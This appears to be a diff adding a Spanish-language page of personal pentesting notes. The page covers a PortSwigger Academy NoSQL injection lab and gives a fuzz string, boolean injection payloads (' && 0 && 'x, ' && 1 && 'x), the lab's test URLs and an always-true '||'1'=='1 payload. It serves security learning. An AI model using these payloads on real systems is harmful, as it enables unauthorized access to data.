@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Para detectar un error enviamos una fuzz string :&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Para detectar un error enviamos una fuzz string :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'"`{
+;$Foo}
+$Foo \xYZ
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="-qué-significa---0--x">🔍 ¿Qué significa <code class="language-plaintext highlighter-rouge">' &amp;&amp; 0 &amp;&amp; 'x</code>?</h3>
+
+<p>Esto es una <strong>inyección lógica</strong> que se traduce así en lógica booleana:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'+%26%26+0+%26%26+'x
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>Evaluación paso a paso:</p>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">'string'</code> es <strong>true</strong> en JavaScript.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">true &amp;&amp; 0</code> = <strong>0</strong> → que es falso.</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">0 &amp;&amp; 'x'</code> = sigue siendo <strong>0</strong> (falso).</p>
+  </li>
+</ol>
+
+<p>Entonces, la condición <strong>es falsa</strong> y debería impedir que los datos se devuelvan (dependiendo de cómo se use la condición en la consulta).</p>
+
+<hr />
+
+<h3 id="-y-qué-hace---1--x">✅ ¿Y qué hace <code class="language-plaintext highlighter-rouge">' &amp;&amp; 1 &amp;&amp; 'x</code>?</h3>
+
+<p>Evaluamos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'+%26%26+1+%26%26+'x
+</code></pre></div></div>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">'</span><span class="s1">string</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<ol>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">'string'</code> → <strong>true</strong></p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">true &amp;&amp; 1</code> = <strong>1</strong> (truthy)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">1 &amp;&amp; 'x'</code> = <strong>‘x’</strong> (truthy)</p>
+  </li>
+</ol>
+
+<p>Así que el resultado es <strong>truthy</strong> y la condición permite que la consulta continúe.</p>
+
+<hr />
+
+<p>No carga</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a8e00a703d8592681e1a24100fe00ab.web-security-academy.net/filter?category=LifeStyle%27+%26%26+0+%26%26+%27x
+</code></pre></div></div>
+
+<p>Carga</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://0a8e00a703d8592681e1a24100fe00ab.web-security-academy.net/filter?category=Lifestyle%27+%26%26+1+%26%26+%27x
+</code></pre></div></div>
+
+<p>or 1=1 – - version nosql :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'||'1'=='1
+%27%7c%7c%27%31%27%3d%3d%27%31
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
